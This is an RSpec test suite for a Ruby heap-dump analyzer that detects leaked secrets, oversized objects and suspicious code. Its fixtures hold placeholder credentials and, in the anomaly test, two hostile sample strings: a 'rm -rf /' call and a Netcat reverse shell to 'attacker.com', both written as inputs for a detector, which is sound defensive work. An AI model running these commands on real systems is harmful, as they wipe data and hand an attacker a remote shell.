# frozen_string_literal: true
#
# RubyGuardian - Heap Analyzer Module Specs
# Tests for analyzing Ruby heap dumps to detect anomalies, leaked secrets,
# and suspicious object patterns.

require 'rspec'
require 'fileutils'
require 'tmpdir'
require 'json'

$LOAD_PATH.unshift(File.expand_path('../lib', __dir__))
require 'heap_analyzer'

RSpec.describe RubyGuardian::MemoryForensics::HeapAnalyzer do
  let(:tmp_dir) { Dir.mktmpdir('rg_heap_test_') }
  let(:logger) do
    l = Logger.new(File::NULL)
    l.level = Logger::DEBUG
    l
  end

  after(:each) do
    FileUtils.rm_rf(tmp_dir)
  end

  def create_heap_dump(objects)
    path = File.join(tmp_dir, "heap_#{SecureRandom.hex(4)}.json")
    File.write(path, objects.map(&:to_json).join("\n"))
    path
  end

  describe '#initialize' do
    it 'accepts a heap dump file path' do
      path = create_heap_dump([{ type: 'STRING', value: 'test' }])
      analyzer = described_class.new(path, logger: logger)
      expect(analyzer.dump_path).to eq(path)
    end

    it 'loads and indexes objects on initialization' do
      objects = Array.new(10) { |i| { type: 'STRING', address: "0x#{i.to_s(16)}" } }
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)
      expect(analyzer.object_count).to eq(10)
    end

    it 'raises an error for empty dump files' do
      path = File.join(tmp_dir, 'empty.json')
      File.write(path, '')
      expect {
        described_class.new(path, logger: logger)
      }.to raise_error(described_class::EmptyDumpError)
    end
  end

  describe '#type_distribution' do
    it 'returns a hash of object types and their counts' do
      objects = [
        { type: 'STRING', value: 'hello' },
        { type: 'STRING', value: 'world' },
        { type: 'ARRAY', length: 3 },
        { type: 'HASH', size: 2 },
        { type: 'OBJECT', class: 'User' }
      ]
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      dist = analyzer.type_distribution
      expect(dist['STRING']).to eq(2)
      expect(dist['ARRAY']).to eq(1)
      expect(dist['HASH']).to eq(1)
      expect(dist['OBJECT']).to eq(1)
    end

    it 'sorts by count descending' do
      objects = Array.new(100) { { type: 'STRING' } } +
                Array.new(50)  { { type: 'ARRAY' } } +
                Array.new(10)  { { type: 'HASH' } }
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      dist = analyzer.type_distribution
      counts = dist.values
      expect(counts).to eq(counts.sort.reverse)
    end
  end

  describe '#detect_leaked_secrets' do
    let(:objects_with_secrets) do
      [
        { type: 'STRING', value: 'normal text content' },
        { type: 'STRING', value: 'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY' },
        { type: 'STRING', value: 'password: hunter2' },
        { type: 'STRING', value: 'GITHUB_TOKEN=ghp_1234567890abcdef1234567890abcdef12345678' },
        { type: 'STRING', value: 'database_url=postgres://user:pass@host/db' },
        { type: 'STRING', value: 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc' },
        { type: 'STRING', value: 'just a regular string' },
        { type: 'ARRAY', length: 5 }
      ]
    end

    it 'identifies AWS credentials in heap strings' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      aws_findings = secrets.select { |s| s[:type] == :aws_credential }
      expect(aws_findings).not_to be_empty
    end

    it 'identifies password patterns' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      password_findings = secrets.select { |s| s[:type] == :password }
      expect(password_findings).not_to be_empty
    end

    it 'identifies API tokens' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      token_findings = secrets.select { |s| s[:type] == :api_token }
      expect(token_findings).not_to be_empty
    end

    it 'identifies connection strings with embedded credentials' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      conn_findings = secrets.select { |s| s[:type] == :connection_string }
      expect(conn_findings).not_to be_empty
    end

    it 'identifies JWT tokens' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      jwt_findings = secrets.select { |s| s[:type] == :jwt_token }
      expect(jwt_findings).not_to be_empty
    end

    it 'does not flag normal strings as secrets' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      values = secrets.map { |s| s[:value] }
      expect(values).not_to include('normal text content')
      expect(values).not_to include('just a regular string')
    end

    it 'returns findings with severity levels' do
      path = create_heap_dump(objects_with_secrets)
      analyzer = described_class.new(path, logger: logger)
      secrets = analyzer.detect_leaked_secrets

      expect(secrets.first).to have_key(:severity)
      expect([:critical, :high, :medium, :low]).to include(secrets.first[:severity])
    end
  end

  describe '#detect_anomalies' do
    it 'flags unusually large string objects' do
      objects = [
        { type: 'STRING', value: 'A' * 10_000, bytesize: 10_000 },
        { type: 'STRING', value: 'small', bytesize: 5 }
      ]
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      anomalies = analyzer.detect_anomalies
      large_strings = anomalies.select { |a| a[:type] == :oversized_string }
      expect(large_strings).not_to be_empty
    end

    it 'flags suspicious eval-related strings' do
      objects = [
        { type: 'STRING', value: 'system("rm -rf /")' },
        { type: 'STRING', value: 'Kernel.exec("nc -e /bin/sh attacker.com 4444")' },
        { type: 'STRING', value: 'normal application string' }
      ]
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      anomalies = analyzer.detect_anomalies
      suspicious = anomalies.select { |a| a[:type] == :suspicious_code }
      expect(suspicious.length).to be >= 2
    end

    it 'flags abnormal object type ratios' do
      # An abnormal heap: 95% Proc objects is unusual
      objects = Array.new(950) { { type: 'DATA', class: 'Proc' } } +
                Array.new(50)  { { type: 'STRING', value: 'x' } }
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      anomalies = analyzer.detect_anomalies
      ratio_anomalies = anomalies.select { |a| a[:type] == :abnormal_ratio }
      expect(ratio_anomalies).not_to be_empty
    end
  end

  describe '#find_references' do
    it 'traces object references by address' do
      objects = [
        { type: 'OBJECT', class: 'User', address: '0x1000', references: ['0x2000', '0x3000'] },
        { type: 'STRING', address: '0x2000', value: 'admin' },
        { type: 'STRING', address: '0x3000', value: 'secret_password' }
      ]
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      refs = analyzer.find_references('0x1000')
      expect(refs.map { |r| r[:address] }).to contain_exactly('0x2000', '0x3000')
    end

    it 'returns empty array for objects with no references' do
      objects = [{ type: 'STRING', address: '0x1000', value: 'isolated' }]
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      refs = analyzer.find_references('0x1000')
      expect(refs).to be_empty
    end
  end

  describe '#generate_report' do
    it 'produces a structured analysis report' do
      objects = [
        { type: 'STRING', value: 'test' },
        { type: 'ARRAY', length: 3 },
        { type: 'STRING', value: 'password=abc123' }
      ]
      path = create_heap_dump(objects)
      analyzer = described_class.new(path, logger: logger)

      report = analyzer.generate_report
      expect(report).to have_key(:summary)
      expect(report).to have_key(:type_distribution)
      expect(report).to have_key(:leaked_secrets)
      expect(report).to have_key(:anomalies)
      expect(report).to have_key(:generated_at)
    end
  end
end
